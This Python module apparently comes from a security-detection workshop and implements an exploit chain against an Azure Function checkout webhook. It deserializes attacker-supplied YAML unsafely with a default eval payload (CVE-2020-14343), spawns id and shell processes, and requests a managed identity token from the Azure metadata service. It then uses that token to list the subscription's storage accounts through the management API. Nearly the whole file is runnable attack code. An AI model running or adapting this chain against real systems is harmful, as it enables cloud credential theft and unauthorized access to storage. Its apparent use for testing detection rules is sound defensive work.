"""Checkout fulfillment YAML exploit chain — Azure Function order-webhook."""
from __future__ import annotations

import json
import os
import subprocess
from pathlib import Path
from typing import Any
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen

WORKSHOP_MARKER = Path("/tmp/jss-order-yaml-chain.txt")
DEFAULT_YAML_PAYLOAD = "!!python/object/apply:builtins.eval\nargs: ['\"exploited\"']"
IMDS_HOST = "169.254.169.254"


def _redact_token(token: str) -> str:
    if not token:
        return ""
    if len(token) <= 12:
        return token[:4] + "..."
    return f"{token[:8]}...{token[-4:]}"


def _run_proc(cmd: list[str], timeout: float = 12) -> dict[str, Any]:
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {
            "command": cmd,
            "returncode": proc.returncode,
            "stdout": proc.stdout.strip(),
            "stderr": proc.stderr.strip(),
        }
    except Exception as exc:
        return {"command": cmd, "returncode": None, "error": str(exc)}


def poisoned_manifest(body: dict) -> str | None:
    manifest = body.get("fulfillmentManifest") or body.get("shippingConfigYaml")
    if isinstance(manifest, str) and manifest.strip():
        return manifest
    return None


def exploit_yaml(payload: str) -> dict[str, Any]:
    import yaml

    try:
        result = yaml.load(payload, Loader=yaml.Loader)
        exploited = result == "exploited" or result is not None
        return {"success": True, "exploited": exploited, "result": str(result)}
    except Exception as exc:
        return {"success": False, "exploited": False, "error": str(exc)}


def _managed_identity_token() -> dict[str, Any]:
    client_id = os.getenv("AZURE_CLIENT_ID") or os.getenv("WEBSITE_SITE_NAME")
    resource = "https://management.azure.com/"
    api_version = "2018-02-01"
    identity_param = f"&client_id={client_id}" if client_id else ""
    token_url = (
        f"http://{IMDS_HOST}/metadata/identity/oauth2/token"
        f"?api-version={api_version}&resource={resource}{identity_param}"
    )

    curl_probe = _run_proc(["curl", "-s", "-H", "Metadata: true", token_url])
    token_redacted: dict[str, Any] = {}
    access_token = ""
    try:
        req = Request(token_url, headers={"Metadata": "true"})
        with urlopen(req, timeout=5) as resp:
            payload = json.loads(resp.read().decode("utf-8"))
        access_token = payload.get("access_token", "")
        token_redacted = {
            "access_token": _redact_token(access_token),
            "expires_in": payload.get("expires_in"),
            "token_type": payload.get("token_type"),
        }
    except (HTTPError, URLError, TimeoutError, OSError, json.JSONDecodeError) as exc:
        token_redacted = {"error": str(exc)}

    return {
        "step": 3,
        "action": "managed_identity_token_theft",
        "scope": "function-runtime",
        "imds_host": IMDS_HOST,
        "client_id": client_id,
        "token_redacted": token_redacted,
        "curl_imds_process": curl_probe,
        "access_token_available": bool(access_token),
        "upwind": ["Azure credentials access", "Metadata server access"],
        "_access_token": access_token,
    }


def _arm_storage_probe(access_token: str) -> dict[str, Any]:
    subscription = os.getenv("AZURE_SUBSCRIPTION_ID") or os.getenv("UPWIND_CLOUD_ACCOUNT_ID")
    storage_accounts: list[str] = []
    error = None
    if access_token and subscription:
        try:
            url = (
                f"https://management.azure.com/subscriptions/{subscription}"
                "/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01"
            )
            req = Request(url, headers={"Authorization": f"Bearer {access_token}"})
            with urlopen(req, timeout=8) as resp:
                payload = json.loads(resp.read().decode("utf-8"))
            storage_accounts = [
                item["name"] for item in payload.get("value", [])[:8] if item.get("name")
            ]
        except (HTTPError, URLError, TimeoutError, OSError, json.JSONDecodeError, KeyError) as exc:
            error = str(exc)
    elif not subscription:
        error = "AZURE_SUBSCRIPTION_ID not set on function"
    else:
        error = "No managed identity access token"

    return {
        "step": 4,
        "action": "arm_storage_enumeration",
        "subscription": subscription,
        "storage_accounts": storage_accounts,
        "error": error,
        "upwind": ["Activity Log storage", "data exfiltration"],
    }


def run_checkout_chain(manifest: str) -> dict[str, Any]:
    chain: list[dict[str, Any]] = []

    yaml_result = exploit_yaml(manifest)
    chain.append(
        {
            "step": 1,
            "action": "yaml.load fulfillmentManifest in handle_checkout",
            "cve": "CVE-2020-14343",
            "pattern": "unsafe_deserialization",
            **yaml_result,
        }
    )

    id_step = _run_proc(["id", "-a"])
    marker_text = f"yaml-chain:{yaml_result.get('result')}\n{id_step.get('stdout', '')}\n"
    WORKSHOP_MARKER.write_text(marker_text, encoding="utf-8")
    chain.append(
        {
            "step": 2,
            "action": "post_exploit_identity_probe",
            "process": id_step,
            "marker_file": str(WORKSHOP_MARKER),
            "upwind": ["Process events", "Operating system utilities processes"],
        }
    )

    shell_pipe = _run_proc(["sh", "-c", f"id 2>&1 | tee -a {WORKSHOP_MARKER}"])
    chain.append(
        {
            "step": 2,
            "action": "shell_pipe_redirect",
            "process": shell_pipe,
            "upwind": ["Shell Process Redirect", "Custom Process rules"],
        }
    )

    identity = _managed_identity_token()
    access_token = identity.pop("_access_token", "")
    chain.append(identity)
    chain.append(_arm_storage_probe(access_token))

    exploited = bool(yaml_result.get("exploited"))
    return {
        "exploited": exploited,
        "pattern": "checkout_fulfillment_yaml_chain",
        "cve": "CVE-2020-14343",
        "scope": "order-webhook-function",
        "chain": chain,
        "narrative": (
            "Attacker submits checkout with poisoned fulfillmentManifest YAML. "
            "Azure Function parses it unsafely, spawns id/shell for tracer Process events, "
            "steals the managed identity token from IMDS, and enumerates storage accounts via ARM."
        ),
        "upwind_policies": [
            "CVE-2020-14343 / unsafe deserialization",
            "Shell Process Redirect",
            "Azure credentials access",
            "Activity Log storage",
        ],
    }
